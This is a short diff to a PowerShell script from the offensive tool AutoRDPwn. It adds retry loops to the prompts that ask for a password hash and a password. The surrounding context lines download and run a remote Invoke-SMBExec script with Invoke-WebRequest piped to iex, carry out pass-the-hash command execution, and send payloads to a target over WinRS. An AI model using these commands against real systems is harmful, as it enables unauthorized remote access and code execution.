@@ -252,8 +252,8 @@ if($Language -in 'Spanish') {
         $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray
         $domain = $Host.UI.ReadLine() ; if(!$domain) { $domain = 'localhost' ; Write-Host "localhost" }
-        Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray
-        $hash = $Host.UI.ReadLine()
+        do { Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray
+        $hash = $Host.UI.ReadLine() ; if(!$hash) { Write-Host $txt6 -ForegroundColor Red }} until ( $hash )
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SMBExec.ps1" -UseBasicParsing | iex
         Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn1" ; Write-Host
@@ -311,8 +311,8 @@ if($Language -in 'Spanish') {
         $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $txt6 -ForegroundColor Red }} until ( $user )
         do { Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-	if(!$password) { Write-Host $txt6 -ForegroundColor Red }} until ( $PlainTextPassword )
-	if(!$PlainTextPassword) { Write-Host "********" } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+	if(!$PlainTextPassword) { Write-Host $txt6 -ForegroundColor Red }} until ( $PlainTextPassword )
+	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn1"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn2"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn3"
